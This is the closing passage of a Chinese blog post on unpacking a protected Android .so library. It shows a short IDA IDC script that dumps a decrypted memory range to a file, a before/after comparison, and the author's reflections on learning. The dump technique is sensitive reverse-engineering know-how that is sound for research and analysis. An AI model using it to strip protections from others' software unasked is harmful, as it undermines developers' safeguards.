<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">auto fp, SoAddress;</div><div class="line">fp = fopen(&quot;D:\\unpack.so&quot;, &quot;wb&quot;);</div><div class="line">for ( SoAddress=0x51F6546C; SoAddress&lt; 0x51F6B7B8; SoAddress++ )</div><div class="line">fputc(Byte(SoAddress), fp);</div></pre></td></tr></table></figure>
<h2 id="脱壳前后对比"><a href="#脱壳前后对比" class="headerlink" title="脱壳前后对比"></a>脱壳前后对比</h2><p>左边为加壳后的指令，都被抹去<br>右边为脱壳后的指令，全部恢复</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>希望通过对这篇文章阅读，你已经对so不再恐惧了。有所思考的读者，肯定会发现，这和脱dex很相似，是的，这就是脱dex的方法在脱so壳上的再利用。很多人遇到问题就百度，就google，百度和google没有的话他就不知所措了，或者说是一直在等他人分享的工具，在这样的心理下，形成了不容易使得他自身技术进步的一种思维方式。我还是想说，很多技术其实网上都有资料，稍微变形或者换了一个新东西很多人就懵了(最近还有人问支付宝内购的问题，论坛里有大量的资料了)，所以说，对知识学习的融会贯通的程度决定了我们能走多远，另外一方面，我们缺的不是资料，缺的是思考，缺的是一个思维定式里的突破。最后希望大家能把学的知识融会贯通，也再次祝大家2016年有新的收获！<br>(<em>^__^</em>)<br>PS：附件附上脱壳前后so。<br>2016.1.2<br>By Ericky</p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  

  <nav id="pagination">
  
  
    <a href="/page/2/" class="next">Next</a>
  
  <div class="clearfix"></div>
</nav>

</div>
  </div>
  <footer id="footer"><div class="copyright">
  
  &copy; 2017 <a href="/">The darkness is no darkness with thee.</a>
  
</div>
<div class="theme-copyright">

</div>
<div class="clearfix"></div></footer>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
<script src="/js/scale.fix.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
  (function($){
    $('.fancybox').fancybox();
  })(jQuery);
</script>

</body>
</html>